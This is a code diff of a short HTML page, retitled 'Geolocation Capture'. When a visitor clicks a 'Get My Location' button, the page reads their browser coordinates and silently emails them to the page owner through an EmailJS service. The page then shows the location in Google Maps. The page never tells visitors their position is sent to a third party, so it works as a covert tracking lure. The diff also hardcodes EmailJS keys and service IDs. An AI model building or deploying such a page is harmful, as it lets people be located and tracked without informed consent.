@@ -3,30 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Test</title>
+    <title>Geolocation Capture</title>
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
-            emailjs.init("LNyReHWB69JrdfiR5j_qI"); // Your EmailJS user ID
+            emailjs.init("bktBt1ja4aV3v45hR"); // Your EmailJS public key (user ID)
         })();
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
 
-        function testEmail() {
+        function sendLocation(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            
+            // Send the location to your email
             emailjs.send("service_rtdzefa", "template_kspwwbf", {
-                latitude: "Test Latitude",
-                longitude: "Test Longitude"
+                latitude: lat,
+                longitude: lon
             })
             .then(function(response) {
                 console.log("SUCCESS!", response.status, response.text);
                 alert("Email sent successfully!");
             }, function(error) {
-                console.log("FAILED...", error);
-                alert("Failed to send email.");
+                console.error("FAILED...", error); // Log error details
+                alert("Failed to send email: " + JSON.stringify(error)); // Show error message
             });
+
+            // Open the location in Google Maps
+            window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
+        }
+
+        function showError(error) {
+            console.error("Error occurred: ", error);
         }
     </script>
 </head>
 <body>
-    <h1>Email Test</h1>
-    <button onclick="testEmail()">Send Test Email</button>
+    <h1>Get Geolocation</h1>
+    <button onclick="getLocation()">Get My Location</button>
 </body>
 </html>
